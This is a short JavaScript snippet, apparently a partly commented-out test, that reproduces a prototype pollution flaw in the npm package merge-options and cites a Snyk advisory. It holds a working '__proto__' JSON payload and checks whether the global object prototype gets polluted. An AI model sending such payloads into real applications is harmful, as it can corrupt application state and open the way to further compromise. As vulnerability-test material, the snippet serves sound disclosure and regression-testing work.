// //https://snyk.io/vuln/npm:merge-options:20180415
// test("prototype pollution in merge-options", () => {
  const merge = require("merge-options");
  const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
  obj = {};

console.log({}.polluted);

  merge({}, JSON.parse(malicious_payload));
console.log({}.polluted);
// });
